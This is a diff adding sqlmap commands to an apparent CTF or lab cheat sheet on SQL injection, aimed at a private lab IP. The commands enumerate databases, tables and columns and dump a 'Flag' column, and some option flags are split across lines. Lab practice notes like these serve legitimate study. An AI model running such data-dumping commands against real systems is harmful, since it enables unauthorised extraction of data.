@@ -120,6 +120,13 @@ SQL:
 Sqli 
 
 -> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs 
+-> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
+-tables
+-> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
+T table_name --columns
+-> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -
+T table_name -C Flag --dump
+
 
 OS-command injection to retrieve a specific file – dvwa 
 
